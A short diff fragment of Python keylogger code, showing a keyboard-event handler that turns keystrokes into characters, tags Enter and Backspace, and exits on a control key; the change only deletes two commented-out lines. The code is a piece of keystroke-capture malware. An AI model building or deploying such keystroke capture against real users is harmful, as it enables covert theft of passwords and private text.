@@ -13,8 +13,6 @@ def OnKeyBoardEvent(event):
     keylogs= chr(event.Ascii)
     if event.Ascii==5:
         _exit(1)
-    #if buffer.length==10:
-    #    print ('\n')
     if event.Ascii==13:
         keylogs='[ENTER]'
     elif event.Ascii==8:
